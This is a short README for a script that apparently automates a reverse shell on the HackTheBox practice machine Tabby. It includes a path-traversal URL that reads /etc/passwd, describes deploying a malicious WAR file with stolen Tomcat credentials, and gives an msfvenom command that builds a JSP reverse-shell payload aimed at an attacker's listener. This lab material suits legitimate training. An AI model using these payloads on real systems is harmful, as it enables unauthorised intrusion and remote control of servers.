# HTB Tabby

## About
Python script that automates a back-connect shell on the HackTheBox machine **Tabby**.

Exploits a file malicious WAR file deployment after gaining tomcat credentials from LFI:
http://tabby.htb/news.php?file=../../../../etc/passwd

## Requirements
Requires netcat to be installed on your system and installed to your $PATH as **nc**

## Usage
Specify the host and port you wish to listen on, along with the path to the malicious WAR shell.

`htb-tabby.py {LHOST} {LPORT} {PATH_TO_WAR_SHELL}`

### Generating a WAR Shell
`msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war`